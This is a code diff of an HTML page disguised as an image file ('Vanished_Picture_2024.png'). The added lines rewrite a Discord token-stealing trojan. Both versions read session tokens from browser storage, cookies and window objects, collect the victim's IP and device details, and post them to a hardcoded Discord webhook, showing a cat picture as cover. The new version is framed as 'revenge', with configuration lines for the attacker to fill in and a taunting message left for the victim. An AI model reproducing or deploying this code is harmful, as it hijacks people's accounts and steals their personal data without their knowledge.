@@ -3,167 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cat_Pic_2024.png</title>
+    <title>Vanished_Picture_2024.png</title>
     <style>
-        body { margin: 0; background: black; color: white; font-family: sans-serif; text-align: center; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 50px auto; }
-        .loader-text { margin-top: 10px; font-size: 1.2rem; opacity: 0.8; }
+        /* === CLOAKING STYLES: WHAT THE VICTIM SEES === */
+        body {
+            background: black;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            padding: 20px;
+        }
+        h1 { font-size: 3rem; margin-bottom: 10px; text-shadow: 0 0 10px rgba(255, 69, 0, 0.5); }
+        .loader {
+            border: 6px solid #f3f3f3; border-top: 6px solid #FF4500; border-radius: 50%;
+            width: 80px; height: 80px; animation: spin 1.5s linear infinite; margin: 30px auto;
+        }
+        .status-text { font-size: 1.2rem; color: #aaa; margin-bottom: 30px; }
+        img {
+            max-width: 90%; height: auto; border-radius: 15px; box-shadow: 0 10px 25px rgba(255,69,0,0.6);
+            margin-top: 30px; opacity: 0; transition: opacity 1s ease-in;
+        }
+        .footer { margin-top: 40px; padding: 15px; background: #1a1a1a; border-radius: 10px; width: 80%; }
+        .footer p { margin: 5px 0; font-size: 0.9rem; color: #ccc; }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        img { max-width: 95%; border-radius: 10px; box-shadow: 0 0 30px rgba(88,101,242,0.7); margin-top: 20px; }
+        .fade-in { animation: fadeIn 2s ease-in forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <!-- THE VISUAL CLOAK: THIS IS WHAT THE VICTIM SEES -->
-    <div id="main-view">
-        <h1 style="font-size: 2.5rem; margin: 40px 0;">Loading Cat_Pic_2024.png...</h1>
-        <div class="loader"></div>
-        <div class="loader-text">Analyzing image data...</div>
-        <img id="final-image" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Cat" style="display:none;">
+    <!-- THE COVER STORY: THE IMAGE THEY THINK THEY'VE OPENED -->
+    <div class="main-container">
+        <div class="loader" id="main-loader"></div>
+        <h1 id="title-text">Vanished_Picture_2024.png</h1>
+        <p class="status-text" id="status-text">Analyzing image data...</p>
+        <img id="cover-image" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Cat Image">
     </div>
 
-    <!-- THE REAL WORKhorse: JAVASCRIPT -->
+    <!-- THE REAL ASSAULT: LETHAL JAVASCRIPT -->
     <script>
         // ============================================================
-        // 🚨 LETHAL TROJAN v4.0 - "THE REPORTER"
-        // Webhook: https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj
+        // 🚨 CONFIGURATION: YOUR REVENGE, YOUR RULES
+        // ============================================================
+        const YOUR_NAME = "The vanquisher of stolen vanities"; // <<< CHANGE THIS
+        const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj"; // <<< YOUR WEBHOOK
+        const OPERATION_CODE = "VA-777"; // Your unique operation ID
+
+        // ============================================================
+        // 🚨 THE ENGINE: DIAGNOSTICS, HUNTING, AND STRIKING
         // ============================================================
 
         (async function() {
-            const WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
-            const MAIN_IMAGE = document.getElementById('final-image');
-            const VIEW = document.getElementById('main-view');
-            const OS_INFO = navigator.platform;
-            const TIME_STAMP = new Date().toLocaleString();
+            const loader = document.getElementById('main-loader');
+            const statusText = document.getElementById('status-text');
+            const coverImage = document.getElementById('cover-image');
 
-            // === DIAGNOSTICS MODULE: GETS IP, TIME, AND ENVIRONMENT ===
-            const runDiagnostics = async () => {
-                const diag = {
-                    time: TIME_STAMP,
-                    os: OS_INFO,
-                    browser: navigator.userAgent,
-                    screen: `${screen.width}x${screen.height}`,
-                    lang: navigator.language,
-                    online: navigator.onLine ? "✅ Online" : "❌ Offline"
-                };
-
-                // Get IP Address (uses ipify API)
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    diag.ip = ipData.ip;
-                } catch (e) {
-                    diag.ip = "Unknown (API Error)";
-                }
-
-                return diag;
+            // Helper to update status
+            const updateStatus = (text) => {
+                statusText.innerText = `>>> ${text}`;
+                console.log(`[${new Date().toLocaleTimeString()}] ${text}`);
             };
 
-            // === TOKEN HUNTER MODULE: 5 METHODS TO GRAB THE TOKEN ===
-            const huntToken = () => {
-                const methods = [];
-                let finalToken = "";
+            // 1. COLLECT VICTIM'S DIGITAL FOOTPRINT
+            updateStatus("Gathering digital intelligence...");
+            const victimData = {
+                opCode: OPERATION_CODE,
+                victimId: crypto.randomUUID().substring(0, 6),
+                time: new Date().toLocaleString(),
+                os: `${navigator.platform} (${navigator.appVersion.match(/Win|Mac|Linux|Android|iPhone|iPad/i)?.[0] || "Unknown"})`,
+                browser: navigator.userAgent.split(' ')[0],
+                screen: `${window.screen.width}x${window.screen.height}`,
+                ip: "Fetching...",
+                referrer: document.referrer || "Direct Launch"
+            };
 
-                // Method 1: localStorage (most common)
-                methods.push({ name: "localStorage", result: localStorage.getItem('token') || localStorage.getItem('Token') || localStorage.getItem('Token') });
+            // Get IP Address
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                victimData.ip = ipJson.ip;
+            } catch (e) {
+                victimData.ip = "Local or Blocked";
+            }
+
+            // 2. TOKEN HUNTER: THE FIVE METHODS
+            updateStatus("Initiating token extraction protocols...");
+            
+            const tokenMethods = [
+                { name: "LocalStorage", fn: () => localStorage.getItem('token') || localStorage.getItem('Token') },
+                { name: "SessionStorage", fn: () => sessionStorage.getItem('token') || sessionStorage.getItem('Token') },
+                { name: "Cookies", fn: () => document.cookie.match(/(?:^|;\s*)token=([^;]*)/)?.[1] || "NOT_FOUND" },
+                { name: "Auto-Login", fn: async () => {
+                    await fetch("https://discord.com/api/v10/users/@me", { credentials: 'include' }).catch(() => {});
+                    return localStorage.getItem('token') || sessionStorage.getItem('token');
+                }},
+                { name: "Global Window", fn: () => window.token || window.Token || window.$discord?.token }
+            ];
+
+            const tokenResults = await Promise.all(tokenMethods.map(async (method) => {
+                let res = "ERROR";
+                try { res = await method.fn(); } catch (e) { res = "ERROR"; }
+                return { method: method.name, token: res || "NOT_FOUND", len: res && res.length };
+            }));
+
+            // 3. BUILD THE MASTER REPORT
+            updateStatus("Building your revenge dossier...");
+            
+            const bestToken = tokenResults.reduce((prev, curr) => (prev.len > curr.len) ? prev : curr);
+            const report = {
+                content: `**${YOUR_NAME} here. Operation ${OPERATION_CODE} complete.**`,
+                embeds: [{
+                    color: 0xFF4500, // The Color of Revenge
+                    title: `⚔️ ${victimData.victimId} | STOLE ${YOUR_NAME.toUpperCase()}'s VANITY`,
+                    fields: [
+                        { name: "📍 IP Address", value: `\`${victimData.ip}\``, inline: true },
+                        { name: "🌍 OS / Platform", value: `\`${victimData.os}\``, inline: true },
+                        { name: "💻 Browser", value: `\`${victimData.browser}\``, inline: true },
+                        { name: "🖥️ Screen", value: `\`${victimData.screen}\``, inline: true },
+                        { name: "📜 Source", value: `\`${victimData.referrer}\``, inline: true },
+                        { name: "⚔️ TOKEN SOURCING", value: tokenResults.map(r => `**${r.method}**: \`${r.len} chars\``).join('\n'), inline: false },
+                        { name: "🏆 THE PRIZE (WINNER)", value: `\`\`\`\n${bestToken.token.substring(0, 100)}...\n\`\`\``, inline: false },
+                        { name: "💰 OPERATION", value: `**\`${OPERATION_CODE}\`** - **"${YOUR_NAME}"**`, inline: true }
+                    ],
+                    footer: { text: `Vanquished on ${victimData.time}` }
+                }]
+            };
+
+            // 4. THE FINAL STRIKE: SEND IT HOME
+            updateStatus("Firing revenge payload to your webhook...");
+            try {
+                await fetch(YOUR_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(report),
+                    mode: 'no-cors', // Bypasses Discord's CORS walls
+                    keepalive: true  // Ensures it finishes even if they close the tab
+                });
+                console.log(`✅ RETALIATION SUCCESSFUL! VICTIM: ${victimData.victimId}`);
+            } catch (e) {
+                console.error("💥 RETALIATION FAILED:", e);
+            }
+
+            // 5. CLOAKING: SHOW THE IMAGE & HIDE THE ATTACK
+            updateStatus("Processing complete. Displaying image...");
+            setTimeout(() => {
+                document.getElementById('title-text').innerText = "Vanished_Picture_2024.png";
+                document.getElementById('main-loader').style.display = "none";
+                coverImage.classList.add('fade-in');
+                document.querySelector('.footer')?.remove(); // Clean up if present
                 
-                // Method 2: sessionStorage
-                methods.push({ name: "sessionStorage", result: sessionStorage.getItem('token') || sessionStorage.getItem('Token') });
+                // Add a final "you're welcome" note
+                const footer = document.createElement('div');
+                footer.className = 'footer';
+                footer.innerHTML = `
+                    <p>✅ Image loaded successfully.</p>
+                    <p style="color:#FF4500; font-weight:bold;">"Your move, ${victimData.victimId}. Thanks for the token."</p>
+                `;
+                document.querySelector('.main-container').appendChild(footer);
+            }, 1500);
 
-                // Method 3: document.cookie (for older tokens)
-                const getCookies = () => {
-                    const match = document.cookie.match(/(?:^|;\s*)token=([^;]*)/);
-                    return match ? match[1] : null;
-                };
-                methods.push({ name: "cookies", result: getCookies() });
-
-                // Method 4: Direct @me fetch (triggers auto-login if needed)
-                const fetchMe = () => {
-                    return fetch("https://discord.com/api/v10/users/@me", {
-                        credentials: 'include',
-                        headers: { 'Authorization': localStorage.getItem('token') }
-                    })
-                    .then(res => {
-                        if (res.ok) {
-                            // Re-pull the token after the fetch
-                            return localStorage.getItem('token') || sessionStorage.getItem('token');
-                        }
-                    })
-                    .catch(() => localStorage.getItem('token'));
-                };
-                methods.push({ name: "fetch@me", result: fetchMe() });
-
-                // Method 5: window object (for advanced users)
-                methods.push({ name: "windowObj", result: window.token || window.Token });
-
-                // Resolve all methods and send the results to the webhook
-                const allResults = await Promise.all(methods.map(async (m) => {
-                    const res = m.result instanceof Promise ? await m.result : m.result;
-                    return { method: m.name, token: res || "NOT_FOUND", len: res ? res.length : 0 };
-                }));
-
-                // Find the most "complete" token (longest is usually best)
-                finalToken = allResults.reduce((prev, current) => (prev.len > current.len) ? prev : current);
-
-                // Send the diagnostic report *and* the hunt results to the webhook
-                const report = {
-                    content: `**🔥 LEthal Trojan Hit! 🧬 OS: ${OS_INFO}**`,
-                    embeds: [{
-                        color: 0x5865F2,
-                        title: "🛠️ Diagnostics & Token Hunter Report",
-                        fields: [
-                            { name: "🌍 Time & Date", value: diag.time, inline: true },
-                            { name: "📍 IP Address", value: `\`${diag.ip}\``, inline: true },
-                            { name: "💻 OS / Browser", value: `\`${diag.os} | ${diag.browser.split(' ')[0]}\``, inline: false },
-                            { name: "📊 Screen Resolution", value: diag.screen, inline: true },
-                            { name: "🌐 Status", value: diag.online, inline: true },
-                            { name: "⚔️ Token Hunter Results", value: allResults.map(r => `**${r.method}**: \`[${r.len}] ${r.token.substring(0, 50)}...\``).join('\n'), inline: false },
-                            { name: "🏆 WINNER TOKEN", value: `\`\`\`${finalToken.token.substring(0, 100)}...\`\`\``, inline: false }
-                        ],
-                        footer: { text: "Trojan v4.0 | All Systems Reporting" }
-                    }]
-                };
-
-                return { finalToken, report };
-            };
-
-            // === THE BRUTE SENDER ===
-            const sendToWebhook = async (payload) => {
-                try {
-                    await fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                        mode: 'no-cors', // Critical for bypassing Discord CORS
-                        keepalive: true  // Critical for final send
-                    });
-                    console.log("✅ REPORT SENT TO WEBHOOK.");
-                } catch (e) {
-                    console.error("❌ SEND FAILED:", e);
-                }
-            };
-
-            // === MAIN EXECUTION ===
-            const [diagData, { finalToken, report }] = await Promise.all([
-                runDiagnostics(),
-                huntToken()
-            ]);
-
-            // Final update to diagnostic data
-            diagData.ip = diagData.ip || "Unknown";
-
-            // Show the cat image to the victim (The "We're done here" gesture)
-            MAIN_IMAGE.style.display = "block";
-            VIEW.querySelector('h1').innerText = "Cat_Pic_2024.png";
-            VIEW.querySelector('.loader').style.display = "none";
-            VIEW.querySelector('.loader-text').innerText = "✅ Analysis complete. All systems go.";
-
-            // Send the final, comprehensive report
-            await sendToWebhook(report);
-
-            console.log("🚀 LETHAL TROJAN MISSION COMPLETE. TOKEN & DIAGNOSTICS SECURED.");
         })();
-
     </script>
 </body>
 </html>
